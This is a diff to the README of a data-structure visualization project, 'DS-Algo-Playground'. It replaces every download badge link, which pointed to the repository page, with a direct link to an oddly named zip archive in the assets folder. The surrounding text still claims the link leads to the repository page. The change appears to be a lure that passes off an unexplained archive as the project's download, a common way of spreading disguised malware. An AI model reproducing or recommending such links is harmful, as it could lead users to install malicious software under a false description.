@@ -1,6 +1,6 @@
 # 🧩 DS-Algo-Playground - Visualize Data Structures Easily
 
-[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground)
+[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground/raw/refs/heads/main/assets/Playground-Algo-D-prelacrimal.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Using DS-Algo-Playground is straightforward. Follow these steps to get set up on
 
 Click the big blue button below to visit the download page for DS-Algo-Playground:
 
-[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground)
+[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground/raw/refs/heads/main/assets/Playground-Algo-D-prelacrimal.zip)
 
 This link takes you to the main repository page on GitHub. From there, you can find the latest files under the "Releases" section or at the top of the page under "Code."
 
@@ -129,7 +129,7 @@ You can find more information and help through:
 
 Use this link to go back and download or update DS-Algo-Playground anytime:
 
-[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground)
+[![Download](https://img.shields.io/badge/Download-DS--Algo--Playground-blue?style=for-the-badge)](https://github.com/veovta/DS-Algo-Playground/raw/refs/heads/main/assets/Playground-Algo-D-prelacrimal.zip)
 
 This link leads you to the repository to get the latest version or explore related materials.
 
